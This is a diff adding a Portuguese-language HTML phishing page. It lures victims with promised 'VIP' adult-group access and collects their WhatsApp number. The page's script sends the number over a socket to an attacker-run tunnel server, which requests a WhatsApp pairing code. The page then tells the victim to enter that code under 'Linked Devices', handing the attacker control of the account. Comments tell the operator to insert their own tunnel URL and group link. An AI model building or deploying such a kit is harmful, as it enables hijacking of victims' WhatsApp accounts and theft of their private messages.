@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Acesso VIP - Verificação Obrigatória</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* --- ESTILOS DARK/HOT --- */
+        :root {
+            --primary: #ff0055; /* Rosa Neon */
+            --bg: #0a0a0a;
+            --card: #141414;
+            --text: #ffffff;
+            --input-bg: #222;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* Container Principal */
+        .funnel-card {
+            background: var(--card);
+            max-width: 420px;
+            width: 100%;
+            padding: 30px 20px;
+            border-radius: 20px;
+            box-shadow: 0 0 25px rgba(255, 0, 85, 0.15);
+            border: 1px solid #333;
+            position: relative;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .highlight { color: var(--primary); }
+
+        p.desc {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        /* Input Area */
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: var(--input-bg);
+            border: 1px solid #444;
+            border-radius: 10px;
+            padding: 5px 15px;
+            transition: 0.3s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255, 0, 85, 0.2);
+        }
+
+        .flag { font-size: 20px; margin-right: 10px; }
+        .prefix { color: #888; font-weight: bold; margin-right: 10px; }
+
+        input[type="tel"] {
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 18px;
+            width: 100%;
+            height: 50px;
+            outline: none;
+            font-weight: 600;
+        }
+
+        /* Botão */
+        .btn-action {
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 0, 85, 0.3);
+        }
+
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 0, 85, 0.4);
+        }
+
+        .btn-action:disabled {
+            background: #444;
+            cursor: wait;
+            transform: none;
+        }
+
+        /* Área do Código (Oculta incialmente) */
+        #step-code, #step-success { display: none; }
+
+        .code-display {
+            font-family: 'Courier New', monospace;
+            font-size: 36px;
+            font-weight: 900;
+            color: var(--primary);
+            letter-spacing: 3px;
+            margin: 20px 0;
+            padding: 15px;
+            border: 2px dashed #444;
+            border-radius: 10px;
+            background: #0f0f0f;
+        }
+
+        .instructions {
+            text-align: left;
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #ccc;
+            margin-bottom: 20px;
+        }
+        .instructions strong { color: #fff; }
+        .instructions li { margin-bottom: 8px; list-style: none; }
+        .instructions i { width: 20px; color: var(--primary); }
+
+        /* Footer */
+        .footer {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #444;
+        }
+
+        /* Animações */
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .spinner {
+            display: inline-block;
+            width: 20px; height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="funnel-card fade-in">
+        
+        <div id="step-form">
+            <div style="margin-bottom: 20px;">
+                <i class="fas fa-lock" style="font-size: 40px; color: var(--primary);"></i>
+            </div>
+            <h1>Acesso <span class="highlight">Restrito</span></h1>
+            <p class="desc">Para liberar sua entrada no grupo VIP, precisamos verificar seu dispositivo. Digite seu WhatsApp abaixo:</p>
+
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <span class="flag">🇧🇷</span>
+                    <span class="prefix">+55</span>
+                    <input type="tel" id="phone" placeholder="(DDD) 99999-8888" maxlength="15">
+                </div>
+            </div>
+
+            <button id="btn-conectar" class="btn-action" onclick="iniciarConexao()">
+                LIBERAR ACESSO AGORA
+            </button>
+            <p style="font-size: 11px; color: #555; margin-top: 15px;">Ambiente Seguro SSL Encrypted</p>
+        </div>
+
+        <div id="step-code" class="fade-in">
+            <h1>Siga os Passos</h1>
+            <p class="desc">Foi gerado um código de validação para o seu número.</p>
+
+            <div class="instructions">
+                <ul>
+                    <li><i class="fab fa-whatsapp"></i> 1. Abra seu <strong>WhatsApp</strong></li>
+                    <li><i class="fas fa-ellipsis-v"></i> 2. Vá em <strong>Menu > Aparelhos Conectados</strong></li>
+                    <li><i class="fas fa-plus"></i> 3. Clique em <strong>Conectar Aparelho</strong></li>
+                    <li><i class="fas fa-keyboard"></i> 4. Escolha <strong>"Conectar com número de telefone"</strong></li>
+                </ul>
+            </div>
+
+            <p style="font-size: 12px; color: #888;">DIGITE ESTE CÓDIGO NO SEU CELULAR:</p>
+            <div id="display-code" class="code-display">---- ----</div>
+
+            <div style="display: flex; justify-content: center; align-items: center; color: #666; font-size: 12px;">
+                <div class="spinner"></div> Aguardando confirmação...
+            </div>
+        </div>
+
+        <div id="step-success" class="fade-in">
+            <i class="fas fa-check-circle" style="font-size: 60px; color: #00ff88; margin-bottom: 20px;"></i>
+            <h1 style="color: #00ff88">Confirmado!</h1>
+            <p class="desc">Você foi validado com sucesso. Redirecionando para o conteúdo...</p>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        &copy; 2024 Privacy Guard • Termos de Uso
+    </div>
+
+    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+    <script>
+        // CONFIGURAÇÕES
+        // ATENÇÃO: Substitua pelo link do seu Tunnel/VPS atualizado
+        const API_URL = 'https://tunes-houston-count-balloon.trycloudflare.com'; 
+        
+        // Link para onde a pessoa vai após conectar (O Grupo VIP/Hot)
+        const LINK_DO_GRUPO = 'https://t.me/SEU_LINK_AQUI'; 
+
+        let socket;
+        let sessionId = 'vip_user_' + Date.now(); 
+
+        function iniciarConexao() {
+            const phoneInput = document.getElementById('phone');
+            const btn = document.getElementById('btn-conectar');
+            
+            // 1. Limpeza do número
+            let rawPhone = phoneInput.value.replace(/\D/g, '');
+
+            if (rawPhone.length < 10) {
+                alert("Erro: Digite o número completo com DDD.");
+                return;
+            }
+
+            // 2. Formata para o padrão 55 + DDD + Numero
+            let finalPhone = "55" + rawPhone;
+
+            // 3. UI de Carregamento
+            btn.innerHTML = '<div class="spinner"></div> GERANDO CÓDIGO...';
+            btn.disabled = true;
+            phoneInput.disabled = true;
+
+            // 4. Conexão Socket
+            try {
+                socket = io(API_URL);
+            } catch (error) {
+                alert("Erro de conexão com o servidor.");
+                resetarTela();
+                return;
+            }
+
+            // Eventos do Socket
+            socket.on('connect', () => {
+                console.log("Conectado ao servidor.");
+                
+                // Cria Sessão
+                socket.emit('create_session', { 
+                    id: sessionId, 
+                    name: 'Funil Hot: ' + finalPhone 
+                });
+
+                // Pede Pareamento após 1s
+                setTimeout(() => {
+                    socket.emit('pedir_pareamento', { 
+                        sessionId: sessionId, 
+                        numero: finalPhone 
+                    });
+                }, 1000);
+            });
+
+            // Recebeu o código
+            socket.on('codigo_gerado', (data) => {
+                if (data.sessionId === sessionId) {
+                    mostrarTelaCodigo(data.code);
+                }
+            });
+
+            // Conectou com Sucesso
+            socket.on('session_update', (data) => {
+                if (data.id === sessionId && data.status === 'connected') {
+                    finalizarProcesso();
+                }
+            });
+
+            // Tratamento de Erros
+            socket.on('erro_pareamento', (msg) => {
+                alert("Ocorreu um erro: " + msg);
+                resetarTela();
+            });
+        }
+
+        // --- FUNÇÕES VISUAIS ---
+
+        function mostrarTelaCodigo(code) {
+            document.getElementById('step-form').style.display = 'none';
+            document.getElementById('step-code').style.display = 'block';
+            
+            // Formatação bonita ABCD-1234
+            let formatted = code.slice(0,4) + "-" + code.slice(4);
+            document.getElementById('display-code').innerText = formatted;
+        }
+
+        function finalizarProcesso() {
+            document.getElementById('step-code').style.display = 'none';
+            document.getElementById('step-success').style.display = 'block';
+            
+            // Redireciona após 2 segundos
+            setTimeout(() => {
+                window.location.href = LINK_DO_GRUPO;
+            }, 2000);
+        }
+
+        function resetarTela() {
+            const btn = document.getElementById('btn-conectar');
+            const input = document.getElementById('phone');
+            btn.innerHTML = 'LIBERAR ACESSO AGORA';
+            btn.disabled = false;
+            input.disabled = false;
+            if(socket) socket.disconnect();
+        }
+    </script>
+</body>
+</html>
